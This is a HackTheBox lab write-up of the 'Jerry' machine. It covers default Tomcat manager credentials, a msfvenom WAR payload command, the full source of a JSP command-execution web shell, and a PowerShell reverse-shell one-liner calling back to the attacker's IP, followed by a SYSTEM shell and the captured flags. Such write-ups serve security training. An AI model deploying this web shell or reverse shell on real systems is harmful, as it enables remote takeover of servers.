---
layout: post
title: "Jerry Writeup - HackTheBox"
category: HackTheBox
---

# HTB lab Machine - Jerry

I started of reverting the machine, and then ran my self made script https://github.com/yassirlaaouissi/EZEA. The exact results can be found in the results/10.129.28.246 folder that I have attached to this post.

## Enumeration summary

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

```

```
[-] [10.129.28.246 tcp/8080/nmap-http] | http-default-accounts:
[-] [10.129.28.246 tcp/8080/nmap-http] |   [Apache Tomcat] at /manager/html/
[-] [10.129.28.246 tcp/8080/nmap-http] |     tomcat:s3cret
[-] [10.129.28.246 tcp/8080/nmap-http] |   [Apache Tomcat Host Manager] at /host-manager/html/
[-] [10.129.28.246 tcp/8080/nmap-http] |_    (no valid default credentials found)

```

```
-] [10.129.28.246 tcp/8080/nmap-http] |   Directory structure:
[-] [10.129.28.246 tcp/8080/nmap-http] |     /
[-] [10.129.28.246 tcp/8080/nmap-http] |       Other: 1; ico: 1; png: 1
[-] [10.129.28.246 tcp/8080/nmap-http] |     /docs/
[-] [10.129.28.246 tcp/8080/nmap-http] |       Other: 1; html: 8; txt: 1
[-] [10.129.28.246 tcp/8080/nmap-http] |     /docs/api/
[-] [10.129.28.246 tcp/8080/nmap-http] |       html: 1
[-] [10.129.28.246 tcp/8080/nmap-http] |     /docs/appdev/
[-] [10.129.28.246 tcp/8080/nmap-http] |       Other: 1
[-] [10.129.28.246 tcp/8080/nmap-http] |     /docs/config/
[-] [10.129.28.246 tcp/8080/nmap-http] |       Other: 1
[-] [10.129.28.246 tcp/8080/nmap-http] |     /examples/
[-] [10.129.28.246 tcp/8080/nmap-http] |       Other: 1
[-] [10.129.28.246 tcp/8080/nmap-http] |   Longest directory structure:
[-] [10.129.28.246 tcp/8080/nmap-http] |     Depth: 2
[-] [10.129.28.246 tcp/8080/nmap-http] |     Dir: /docs/appdev/
[-] [10.129.28.246 tcp/8080/nmap-http] |   Total files found (by extension):
[-] [10.129.28.246 tcp/8080/nmap-http] |_    Other: 5; html: 9; ico: 1; png: 1; txt: 1

```

## Exploitation

Please login here: http://10.129.28.246:8080/manager/html/ creds are tomcat:s3cret as the scanning results said. Generate a payload:

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.31 LPORT=4444 -f war > shell.war
```

Sadly that did not work. So I went on and made a JSP shell with the following steps:

1. make a file called index.jsp with the following contents:

   ```
   <FORM METHOD=GET ACTION='index.jsp'>
   <INPUT name='cmd' type=text>
   <INPUT type=submit value='Run'>
   </FORM>
   <%@ page import="java.io.*" %>
   <%
      String cmd = request.getParameter("cmd");
      String output = "";
      if(cmd != null) {
         String s = null;
         try {
            Process p = Runtime.getRuntime().exec(cmd,null,null);
            BufferedReader sI = new BufferedReader(new
   InputStreamReader(p.getInputStream()));
            while((s = sI.readLine()) != null) { output += s+"</br>"; }
         }  catch(IOException e) {   e.printStackTrace();   }
      }
   %>
   <pre><%=output %></pre>
   ```

2. Do this:

   ```
   mkdir webshell
   cp index.jsp webshell/
   cd webshell
   jar -cvf ../webshell.war *
   ```

3. Upload the war file to /manager/html, and go to http://10.129.28.246:8080/webshell/index.jsp?cmd=whoami

![image-20210530161813814.png](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210530161813814.png)

Wow lol, lets get an actual reverse shell:

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.31',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

```

```
┌──(kali㉿kali)-[~/Desktop/DownloadedScripts/webshell]
└─$ nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.31] from 10.129.28.246 [10.129.28.246] 49192
id
whoamiPS C:\apache-tomcat-7.0.88>
nt authority\system
PS C:\apache-tomcat-7.0.88>

```

```
PS C:\Users\Administrator\Desktop\flags> type 2\ for\ the\ price\ of\ 1.txt
PS C:\Users\Administrator\Desktop\flags> type *
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
PS C:\Users\Administrator\Desktop\flags> whoami
nt authority\system
PS C:\Users\Administrator\Desktop\flags>

```

## Final thoughts

This was done in 10 minutes. Learned a new method to exploit apache tomcat /manager/html
